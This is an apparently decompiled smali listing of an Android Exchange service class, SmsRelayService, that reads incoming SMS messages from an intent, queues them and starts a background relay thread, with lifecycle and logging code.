.class public Lcom/android/exchange/SmsRelayService;
.super Landroid/app/Service;
.source "SmsRelayService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/exchange/SmsRelayService$1;,
        Lcom/android/exchange/SmsRelayService$RelaySmsRunnable;,
        Lcom/android/exchange/SmsRelayService$SmsPayload;
    }
.end annotation


# instance fields
.field private mRelayThread:Ljava/lang/Thread;

.field private mSmsQueue:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Lcom/android/exchange/SmsRelayService$SmsPayload;",
            ">;"
        }
    .end annotation
.end field

.field private mStop:Z

.field private mSyncObject:Ljava/lang/Object;

.field private mTm:Landroid/telephony/TelephonyManager;


# direct methods
.method public constructor <init>()V
    .registers 3

    .prologue
    const/4 v1, 0x0

    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 28
    new-instance v0, Ljava/lang/Object;

    invoke-direct/range {v0 .. v0}, Ljava/lang/Object;-><init>()V

    iput-object v0, p0, Lcom/android/exchange/SmsRelayService;->mSyncObject:Ljava/lang/Object;

    .line 30
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/android/exchange/SmsRelayService;->mSmsQueue:Ljava/util/ArrayList;

    .line 32
    iput-object v1, p0, Lcom/android/exchange/SmsRelayService;->mRelayThread:Ljava/lang/Thread;

    .line 34
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/exchange/SmsRelayService;->mStop:Z

    .line 36
    iput-object v1, p0, Lcom/android/exchange/SmsRelayService;->mTm:Landroid/telephony/TelephonyManager;

    .line 110
    return-void
.end method

.method static synthetic access$100(Lcom/android/exchange/SmsRelayService;)Ljava/lang/Object;
    .registers 2
    .parameter "x0"

    .prologue
    .line 22
    iget-object v0, p0, Lcom/android/exchange/SmsRelayService;->mSyncObject:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$200(Lcom/android/exchange/SmsRelayService;)Landroid/telephony/TelephonyManager;
    .registers 2
    .parameter "x0"

    .prologue
    .line 22
    iget-object v0, p0, Lcom/android/exchange/SmsRelayService;->mTm:Landroid/telephony/TelephonyManager;

    return-object v0
.end method

.method static synthetic access$300(Lcom/android/exchange/SmsRelayService;)Ljava/util/ArrayList;
    .registers 2
    .parameter "x0"

    .prologue
    .line 22
    iget-object v0, p0, Lcom/android/exchange/SmsRelayService;->mSmsQueue:Ljava/util/ArrayList;

    return-object v0
.end method

.method static synthetic access$400(Lcom/android/exchange/SmsRelayService;)Z
    .registers 2
    .parameter "x0"

    .prologue
    .line 22
    iget-boolean v0, p0, Lcom/android/exchange/SmsRelayService;->mStop:Z

    return v0
.end method

.method static synthetic access$500(Lcom/android/exchange/SmsRelayService;)V
    .registers 1
    .parameter "x0"

    .prologue
    .line 22
    invoke-direct {p0}, Lcom/android/exchange/SmsRelayService;->onDone()V

    return-void
.end method

.method private onDone()V
    .registers 2

    .prologue
    .line 107
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/exchange/SmsRelayService;->mRelayThread:Ljava/lang/Thread;

    .line 108
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .parameter "intent"

    .prologue
    .line 103
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 2

    .prologue
    .line 48
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 50
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lcom/android/exchange/SmsRelayService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lcom/android/exchange/SmsRelayService;->mTm:Landroid/telephony/TelephonyManager;

    .line 51
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .prologue
    const/4 v1, 0x0

    .line 92
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 93
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/exchange/SmsRelayService;->mStop:Z

    .line 94
    iput-object v1, p0, Lcom/android/exchange/SmsRelayService;->mRelayThread:Ljava/lang/Thread;

    .line 95
    iget-object v0, p0, Lcom/android/exchange/SmsRelayService;->mSmsQueue:Ljava/util/ArrayList;

    if-eqz v0, :cond_12

    .line 96
    iget-object v0, p0, Lcom/android/exchange/SmsRelayService;->mSmsQueue:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    .line 98
    :cond_12
    iput-object v1, p0, Lcom/android/exchange/SmsRelayService;->mSmsQueue:Ljava/util/ArrayList;

    .line 99
    return-void
.end method

.method public onLowMemory()V
    .registers 2

    .prologue
    .line 86
    invoke-super {p0}, Landroid/app/Service;->onLowMemory()V

    .line 87
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/exchange/SmsRelayService;->mStop:Z

    .line 88
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 9
    .parameter "intent"
    .parameter "flags"
    .parameter "startId"

    .prologue
    .line 55
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v1

    .line 57
    .local v1, result:I
    const-string v2, "SmsRelayService"

    const-string v3, "Received SMS"

    invoke-static {v2, v3}, Lcom/android/exchange/ExchangeService;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 60
    if-nez p1, :cond_15

    .line 61
    const-string v2, "SmsRelayService"

    const-string v3, "SmsRelayService.onStartCommand: intent is null"

    invoke-static {v2, v3}, Lcom/android/exchange/ExchangeService;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 81
    :cond_14
    :goto_14
    return v1

    .line 66
    :cond_15
    const-string v2, "smsRelay"

    const/4 v3, 0x0

    invoke-virtual {p1, v2, v3}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_14

    .line 70
    iget-object v3, p0, Lcom/android/exchange/SmsRelayService;->mSyncObject:Ljava/lang/Object;

    monitor-enter v3

    .line 71
    :try_start_21
    invoke-static {p1}, Landroid/provider/Telephony$Sms$Intents;->getMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/SmsMessage;

    move-result-object v0

    .line 72
    .local v0, messages:[Landroid/telephony/SmsMessage;
    iget-object v2, p0, Lcom/android/exchange/SmsRelayService;->mSmsQueue:Ljava/util/ArrayList;

    new-instance v4, Lcom/android/exchange/SmsRelayService$SmsPayload;

    invoke-direct {v4, p0, v0}, Lcom/android/exchange/SmsRelayService$SmsPayload;-><init>(Lcom/android/exchange/SmsRelayService;[Landroid/telephony/SmsMessage;)V

    invoke-virtual {v2, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 73
    const-string v2, "SmsRelayService"

    const-string v4, "SMS Added to relay que"

    invoke-static {v2, v4}, Lcom/android/exchange/ExchangeService;->log(Ljava/lang/String;Ljava/lang/String;)V

    .line 74
    monitor-exit v3
    :try_end_37
    .catchall {:try_start_21 .. :try_end_37} :catchall_50

    .line 76
    iget-object v2, p0, Lcom/android/exchange/SmsRelayService;->mRelayThread:Ljava/lang/Thread;

    if-nez v2, :cond_14

    .line 77
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/android/exchange/SmsRelayService$RelaySmsRunnable;

    const/4 v4, 0x0

    invoke-direct {v3, p0, v4}, Lcom/android/exchange/SmsRelayService$RelaySmsRunnable;-><init>(Lcom/android/exchange/SmsRelayService;Lcom/android/exchange/SmsRelayService$1;)V

    const-string v4, "smsRelay"

    invoke-direct {v2, v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v2, p0, Lcom/android/exchange/SmsRelayService;->mRelayThread:Ljava/lang/Thread;

    .line 78
    iget-object v2, p0, Lcom/android/exchange/SmsRelayService;->mRelayThread:Ljava/lang/Thread;

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    goto :goto_14

    .line 74
    .end local v0           #messages:[Landroid/telephony/SmsMessage;
    :catchall_50
    move-exception v2

    :try_start_51
    monitor-exit v3
    :try_end_52
    .catchall {:try_start_51 .. :try_end_52} :catchall_50

    throw v2
.end method
